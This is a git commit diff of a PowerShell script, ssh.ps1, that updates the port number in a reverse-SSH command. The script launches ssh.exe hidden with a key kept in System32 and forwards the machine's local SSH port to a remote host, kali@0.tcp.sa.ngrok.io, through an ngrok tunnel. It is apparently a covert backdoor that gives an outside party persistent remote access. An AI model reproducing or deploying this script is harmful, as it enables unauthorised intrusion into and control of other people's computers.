03b412e4052e43621f9469e5b41a25137d8867ac
usermants <sanchezguy@proton.me>
2025-09-03 19:14:04 -0300

    Update ssh.ps1

--- ssh.ps1
+++ ssh.ps1
@@ -5,7 +5,7 @@ $sshPath = "C:\Windows\System32\OpenSSH\ssh.exe"
 $keyPath = "C:\Windows\System32\OpenSSH\revssh_key"
 
 # Argumentos do SSH
-$sshArgs = "-i `"$keyPath`" -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 kali@0.tcp.sa.ngrok.io -p 17128 -N"
+$sshArgs = "-i `"$keyPath`" -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes -R 2222:localhost:22 kali@0.tcp.sa.ngrok.io -p 15920 -N"
 
 # Executa SSH em segundo plano invisível
 Start-Process -FilePath $sshPath -ArgumentList $sshArgs -WindowStyle Hidden
